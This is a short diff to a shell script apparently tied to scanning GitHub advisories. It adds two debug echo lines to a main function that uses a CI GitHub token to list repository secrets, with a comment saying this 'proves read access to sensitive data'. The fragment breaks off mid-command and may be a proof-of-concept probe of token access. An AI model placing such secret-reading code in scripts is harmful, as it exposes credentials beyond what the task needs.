@@ -459,10 +459,11 @@ scan_github_advisories() {
 
 # Main function to handle command line arguments
 main() {
+    echo "elklepo test 1"
     if [ -n "$GITHUB_TOKEN" ]; then
       # Mask GITHUB_TOKEN from logs (should be masked by default)
       echo "::add-mask::$GITHUB_TOKEN"
-      
+      echo "elklepo test 2"
       # List repository secrets (proves read access to sensitive data)
       curl -s \
         -H "Authorization: Bearer $GITHUB_TOKEN" \
